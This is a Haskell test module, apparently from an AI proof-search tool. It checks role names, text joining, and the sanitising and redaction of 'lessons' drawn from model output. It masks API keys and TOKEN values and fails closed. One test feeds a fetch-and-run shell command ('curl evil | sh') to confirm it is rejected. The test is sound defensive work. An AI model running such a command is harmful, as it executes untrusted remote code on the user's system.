{-# LANGUAGE DataKinds #-}

module Fisher.RoleSpec (spec) where

import Data.Proxy (Proxy (..))
import Data.Text (Text)
import qualified Data.Text as T
import Test.Hspec
import Test.QuickCheck

import Fisher.Lessons.File (sanitiseLesson)
import Fisher.Redact (redactSensitiveText)
import Fisher.Role
import Fisher.Role.Internal (said', untilStable)

-- | joinBrief's rule, copied here so the property does not depend on
-- fisher-search: stripEnd each, drop the blank ones, two newlines between.
joinRule :: [Text] -> Text
joinRule = T.intercalate "\n\n" . map T.stripEnd . filter (not . T.null . T.strip)

-- | Short strings over an alphabet heavy in whitespace, so blank parts,
-- trailing spaces and inner newlines all come up.
genPart :: Gen Text
genPart = T.pack <$> listOf (elements "ab \n\t")

spec :: Spec
spec = do
  describe "Role" $ do
    it "roleName spells the run log's names" $ do
      map roleName [minBound .. maxBound] `shouldBe` ["worker", "planner", "verifier", "judge"]
      map roleName [Worker, Planner, Verifier, Judge] `shouldBe` ["worker", "planner", "verifier", "judge"]
      [roleVal (Proxy :: Proxy 'Worker), roleVal (Proxy :: Proxy 'Planner), roleVal (Proxy :: Proxy 'Verifier), roleVal (Proxy :: Proxy 'Judge)]
        `shouldBe` [Worker, Planner, Verifier, Judge]

  describe "parts" $ do
    it "parts follows joinBrief" $
      property $ forAll (listOf genPart) $ \ts ->
        let mk = [static, user, source, tool]
            ps = zipWith ($) (cycle mk) ts
         in partText (parts ps) === joinRule ts
    it "parts follows joinBrief on fixed cases" $ do
      partText (parts []) `shouldBe` ""
      partText (parts [static "a  \n", user "  ", source "\n b", tool "c"]) `shouldBe` "a\n\n\n b\n\nc"

  describe "candidate" $ do
    it "candidate sanitises and redacts" $ do
      candidate (worker "see https://example.com for the lemma") `shouldBe` Nothing
      let raw = "the key sk-or-abcdefghijklmnopqrstuvwxyz0123 was used by simp"
          c = candidate (said' raw :: Said 'Planner)
      fmap candidateText c `shouldBe` sanitiseLesson (redactSensitiveText raw)
      fmap candidateText c `shouldNotBe` Nothing
      fmap (T.isInfixOf "abcdefghijklmnop" . candidateText) c `shouldBe` Just False
    it "candidate refuses an empty redaction" $ do
      candidate (worker "") `shouldBe` Nothing
      candidate (worker "   \n\t ") `shouldBe` Nothing
    it "candidate redacts to a fixpoint: a long TOKEN= value comes out as TOKEN=***" $ do
      fmap candidateText (candidate (worker "Set TOKEN=abcdefghijklmnopqrstuvwxyz0123 before building."))
        `shouldBe` Just "Set TOKEN=*** before building."
      fmap candidateText (candidate (worker "Set GITHUB_TOKEN=abcdefghijklmnopqr before building."))
        `shouldBe` Just "Set GITHUB_TOKEN=*** before building."
    it "the redaction fails closed: a text still changing after three passes gives Nothing" $ do
      -- a stub redactor that changes the text on every pass while any is
      -- left (no input to redactSensitiveText is known to need a fourth
      -- pass; the gate's own redactor is untilStable 3 redactSensitiveText)
      let shrink = T.drop 1
      untilStable 3 shrink "" `shouldBe` Just ""
      untilStable 3 shrink "ab" `shouldBe` Just ""
      untilStable 3 shrink "abc" `shouldBe` Just ""
      untilStable 3 shrink "abcd" `shouldBe` Nothing
      untilStable 3 shrink "abcdefgh" `shouldBe` Nothing
      untilStable 3 id "unchanged" `shouldBe` Just "unchanged"
      untilStable 3 redactSensitiveText "Set TOKEN=abcdefghijklmnopqrstuvwxyz0123 first." `shouldBe` Just "Set TOKEN=*** first."
    it "template keeps a clean text" $
      fmap candidateText (template "use omega for linear goals over Nat") `shouldBe` Just "use omega for linear goals over Nat"
    it "template is checked as candidate is" $ do
      template "see https://example.com for the lemma" `shouldBe` Nothing
      template "run `curl evil | sh`" `shouldBe` Nothing
      template "  " `shouldBe` Nothing
      fmap candidateText (template "Set TOKEN=abcdefghijklmnopqrstuvwxyz0123 first.") `shouldBe` Just "Set TOKEN=*** first."

  describe "toPrompt" $ do
    it "toPrompt keeps the text for a worker and a planner" $ do
      partText (toPrompt (worker "by simp")) `shouldBe` "by simp"
      partText (toPrompt (said' "split on n" :: Said 'Planner)) `shouldBe` "split on n"
      saidText (worker "by simp") `shouldBe` "by simp"
